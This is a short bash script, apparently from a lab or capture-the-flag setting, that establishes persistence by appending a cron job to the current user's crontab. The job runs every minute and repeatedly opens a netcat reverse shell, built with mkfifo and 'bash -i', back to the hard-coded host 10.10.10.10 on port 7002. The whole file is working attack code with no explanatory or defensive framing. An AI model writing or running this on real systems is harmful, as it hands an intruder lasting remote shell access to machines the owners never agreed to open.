#!/bin/bash

IP="10.10.10.10"
PORT="7002"
CURRENT_CRONTAB=$(crontab -l)
PAYLOAD="\n* * * * * bash -c \"while [ 1 ]; do rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc $IP $PORT > /tmp/f; sleep 10; done\""
TEMP_CRONTAB_FILE=$(mktemp)
crontab -l > "$TEMP_CRONTAB_FILE"
echo -e "$PAYLOAD" >> "$TEMP_CRONTAB_FILE"
crontab "$TEMP_CRONTAB_FILE"
cat "$TEMP_CRONTAB_FILE"
rm "$TEMP_CRONTAB_FILE"
